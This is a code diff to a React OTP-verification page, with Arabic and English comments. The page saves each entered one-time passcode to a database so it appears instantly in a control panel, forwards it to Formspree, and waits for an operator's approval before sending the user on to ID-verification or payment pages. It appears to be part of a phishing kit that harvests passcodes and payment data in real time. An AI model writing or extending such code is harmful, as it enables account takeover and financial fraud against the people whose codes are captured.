@@ -51,7 +51,6 @@ const OTPVerification = () => {
   // حفظ لحظي لرمز OTP في قاعدة البيانات ليظهر فوراً في لوحة التحكم
   useAutoSave(applicationId, {
     otp_code: otp,
-    current_step: 'otp',
   }, "OTPVerification");
 
   // Send OTP data to Formspree in real-time
@@ -108,6 +107,14 @@ const OTPVerification = () => {
           setTimeout(() => {
             navigate(`/id-verification?company=${encodeURIComponent(companyName)}&price=${price}`);
           }, 3000);
+        } else if (
+          data?.status === 'rejected' &&
+          (data as any)?.current_step === 'payment' &&
+          !(data as any)?.payment_approved
+        ) {
+          clearInterval(interval);
+          setWaitingForApproval(false);
+          navigate(`/payment?company=${encodeURIComponent(companyName)}&price=${price}&rejected=1`, { replace: true });
         } else if (data?.status === 'rejected') {
           clearInterval(interval);
           setWaitingForApproval(false);
